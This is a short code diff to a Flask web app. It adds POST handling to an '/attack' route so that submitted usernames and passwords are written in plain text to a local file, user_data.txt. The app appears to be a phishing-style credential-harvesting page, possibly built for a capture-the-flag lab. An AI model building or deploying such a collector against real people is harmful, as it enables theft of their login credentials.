@@ -266,9 +266,18 @@ def set_flag(user_id):
 @app.route('/attack',methods=['GET','POST'])
 def attack():
     # users = User.query.all()
+    if request.method == 'POST':
+            username = request.form['username']
+            password = request.form['password']
+
+            with open('user_data.txt', 'a') as file:
+                file.write(f'Username: {username}, Password: {password}\n')
+                return render_template("attack.html")
+                
+
+        
     return render_template("attack.html")
     
-
 
 if __name__ == '__main__':
     with app.app_context():
